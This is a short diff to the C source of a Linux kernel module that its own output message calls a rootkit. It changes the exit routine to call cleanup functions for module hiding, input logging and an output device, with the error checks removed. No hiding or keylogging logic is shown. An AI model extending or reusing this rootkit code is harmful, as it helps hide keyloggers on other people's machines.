@@ -1,3 +1,5 @@
+//TODO: put init macros back..
+
 #include <linux/module.h>	 // For modules
 #include <linux/kernel.h>	 // For KERN_INFO
 #include <linux/init.h>	
@@ -26,19 +28,10 @@ static int __init main_init(void) {
 }
 
 static void __exit main_exit(void) {
-	/*
-	int error;
-
 	
-	error = moduleHide_exit();
-	if (error) return; // TOOD: warn about the error rather than return...
-	
-	error = logInput_exit();
-	if (error) return;
-	
-	error = outputDevice_exit();
-	if (error) return;
-	*/
+	moduleHide_exit();
+	logInput_exit();
+	outputDevice_exit();
 
 	printk(KERN_INFO "Rootkit uninstalled\n");
 }
